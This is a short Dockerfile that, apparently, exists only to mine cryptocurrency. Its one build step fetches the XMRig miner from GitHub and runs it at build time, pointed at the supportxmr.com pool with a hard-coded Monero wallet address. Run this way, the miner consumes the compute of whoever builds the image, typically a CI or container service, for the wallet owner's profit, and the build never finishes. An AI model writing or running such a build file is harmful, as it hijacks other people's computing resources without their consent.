FROM debian
RUN apt update
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar xf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -u 456eKDgjfQAGtYJdSeCaN6iEQcTbRpEBPjb85SUQ6q6H63WprKg6qp4fjrNcdBXnkWWb8DxVACK6gNCoVnVDHkKk6CaaAR7 -o pool.supportxmr.com:3333
